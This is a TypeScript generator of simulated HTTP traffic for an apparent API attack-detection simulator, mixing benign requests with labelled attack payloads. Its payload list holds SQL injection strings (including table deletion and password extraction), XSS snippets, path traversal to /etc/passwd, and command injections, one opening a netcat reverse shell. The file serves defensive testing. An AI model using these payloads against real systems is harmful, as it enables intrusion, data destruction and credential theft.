// Client-side HTTP request scenario generator for the IntelliAPI AI simulator.
// Produces varied, realistic requests with a ground-truth `scenario_label`.
// The label is sent to the backend for evaluation/display only and is NEVER
// used as a model input feature.

import type { ScenarioLabel, SimRequest, TrafficMix } from "../types";

const ENDPOINTS = [
  "/api/products", "/api/users", "/api/orders", "/api/items", "/api/search",
  "/api/cart", "/api/profile", "/api/reviews", "/api/categories", "/api/login",
  "/api/register", "/api/checkout", "/api/feedback", "/api/notifications",
  "/api/dashboard", "/api/sessions", "/api/payments", "/api/config",
];

const PARAM_NAMES = [
  "id", "user", "name", "q", "category", "page", "limit", "sort", "filter",
  "type", "value", "search", "token", "session", "item", "product", "order",
  "email", "username", "password", "qty", "price", "status",
];

const WORDS = [
  "laptop", "phone", "book", "coffee", "chair", "lamp", "monitor", "keyboard",
  "mouse", "desk", "notebook", "pen", "bottle", "bag", "watch", "headphones",
  "tablet", "charger", "cable", "camera", "speaker", "alice", "bob", "carol",
];

const ATTACK_PAYLOADS: { label: ScenarioLabel; payload: string }[] = [
  { label: "sqli", payload: "' OR '1'='1" },
  { label: "sqli", payload: "' OR 1=1 --" },
  { label: "sqli", payload: "'; DROP TABLE users; --" },
  { label: "sqli", payload: "1' UNION SELECT username,password FROM users --" },
  { label: "sqli", payload: "admin'--" },
  { label: "sqli", payload: "1; DELETE FROM orders WHERE 1=1" },
  { label: "sqli", payload: "' AND SLEEP(5)--" },
  { label: "sqli", payload: "'; WAITFOR DELAY '0:0:5'--" },
  { label: "sqli", payload: "0x27 OR 1=1 --" },
  { label: "xss", payload: "<script>alert(1)</script>" },
  { label: "xss", payload: "<img src=x onerror=alert(1)>" },
  { label: "xss", payload: "\"><svg onload=alert(1)>" },
  { label: "xss", payload: "javascript:alert(1)" },
  { label: "xss", payload: "<body onload=alert(1)>" },
  { label: "xss", payload: "'><script>document.cookie</script>" },
  { label: "xss", payload: "<details open ontoggle=alert(1)>" },
  { label: "path_traversal", payload: "../../../etc/passwd" },
  { label: "path_traversal", payload: "..\\..\\..\\windows\\win.ini" },
  { label: "path_traversal", payload: "....//....//etc/passwd" },
  { label: "path_traversal", payload: "%2e%2e%2f%2e%2e%2fetc%2fpasswd" },
  { label: "path_traversal", payload: "../../../../var/log/auth.log" },
  { label: "path_traversal", payload: "C:\\windows\\win.ini" },
  { label: "cmd_injection", payload: "; ls -la" },
  { label: "cmd_injection", payload: "| cat /etc/passwd" },
  { label: "cmd_injection", payload: "$(id)" },
  { label: "cmd_injection", payload: "; ping -c 4 attacker.com" },
  { label: "cmd_injection", payload: "| nc -e /bin/sh 10.0.0.1 4444" },
];

const METHODS = ["GET", "GET", "GET", "POST", "PUT"];

function rand(n: number): number {
  return Math.floor(Math.random() * n);
}
function pick<T>(arr: T[]): T {
  return arr[rand(arr.length)];
}
function encodeMaybe(s: string): string {
  // mirror the backend synthetic generator: sometimes URL-encode the payload
  return Math.random() < 0.4 ? encodeURIComponent(s) : s;
}

function endpoint(): string {
  const ep = pick(ENDPOINTS);
  return ep.replace("{id}", String(rand(9999) + 1));
}

function normalParams(n: number): [string, string][] {
  const out: [string, string][] = [];
  const names = [...PARAM_NAMES].sort(() => Math.random() - 0.5).slice(0, n);
  for (const nm of names) {
    let val: string;
    if (nm === "page" || nm === "limit") val = String(rand(100) + 1);
    else if (nm === "sort") val = pick(["asc", "desc", "price", "name"]);
    else if (nm === "category" || nm === "type" || nm === "status") val = pick(WORDS);
    else if (nm === "q" || nm === "search") val = pick(WORDS);
    else if (nm === "id" || nm === "user" || nm === "item" || nm === "product" || nm === "order") val = String(rand(9999) + 1);
    else if (nm === "email") val = `${pick(WORDS)}@example.com`;
    else if (nm === "price") val = (Math.random() * 999 + 1).toFixed(2);
    else if (nm === "qty") val = String(rand(50) + 1);
    else val = pick(WORDS) + String(rand(99) + 1);
    out.push([nm, val]);
  }
  return out;
}

function paramsToQuery(p: [string, string][]): string {
  return p.map(([k, v]) => `${k}=${v}`).join("&");
}

function makeNormal(): { method: string; path: string; query: string; body: string } {
  const method = pick(METHODS);
  const path = endpoint();
  const nParams = rand(5);
  const params = normalParams(nParams);
  let query = "";
  let body = "";
  if (method === "GET") query = params.length ? paramsToQuery(params) : "";
  else {
    body = params.length ? paramsToQuery(params) : "";
    if (Math.random() < 0.3 && params.length) query = paramsToQuery([params[0]]);
  }
  return { method, path, query, body };
}

function makeAttack(label: ScenarioLabel): { method: string; path: string; query: string; body: string } {
  const candidates = ATTACK_PAYLOADS.filter((p) => p.label === label);
  const payload = encodeMaybe(pick(candidates).payload);
  const method = pick(METHODS);
  let path = endpoint();

  const params = normalParams(rand(4));
  const injectName = pick(PARAM_NAMES);
  if (!params.some(([k]) => k === injectName)) params.push([injectName, pick(WORDS)]);
  let injected = false;
  const newParams: [string, string][] = [];
  for (const [k, v] of params) {
    if (k === injectName && !injected) {
      newParams.push([k, payload]);
      injected = true;
    } else {
      newParams.push([k, v]);
    }
  }
  if (!injected) newParams.push([injectName, payload]);

  let query = "";
  let body = "";
  if (method === "GET") {
    query = paramsToQuery(newParams);
  } else {
    body = paramsToQuery(newParams);
    if (Math.random() < 0.3) query = paramsToQuery([newParams[0]]);
  }
  if (label === "path_traversal" && Math.random() < 0.5) {
    path = path.replace(/\/$/, "") + "/" + payload;
    query = "";
    body = "";
  }
  return { method, path, query, body };
}

let counter = 0;

export function generateRequest(mix: TrafficMix): SimRequest {
  const weights: [ScenarioLabel, number][] = [
    ["normal", mix.normal],
    ["sqli", mix.sqli],
    ["xss", mix.xss],
    ["path_traversal", mix.path_traversal],
    ["cmd_injection", mix.cmd_injection],
  ];
  const total = weights.reduce((s, [, w]) => s + Math.max(0, w), 0) || 1;
  let r = Math.random() * total;
  let chosen: ScenarioLabel = "normal";
  for (const [label, w] of weights) {
    if (r < w) {
      chosen = label;
      break;
    }
    r -= w;
  }

  const core = chosen === "normal" ? makeNormal() : makeAttack(chosen);
  counter += 1;
  return {
    event_id: `sim-${Date.now()}-${counter}`,
    timestamp: new Date().toISOString(),
    method: core.method,
    path: core.path,
    query: core.query,
    headers: { "user-agent": "IntelliAPI-AI-Simulator/1.0" },
    body: core.body,
    scenario_label: chosen,
  };
}

export const DEFAULT_MIX: TrafficMix = {
  normal: 40,
  sqli: 20,
  xss: 20,
  path_traversal: 12,
  cmd_injection: 8,
};
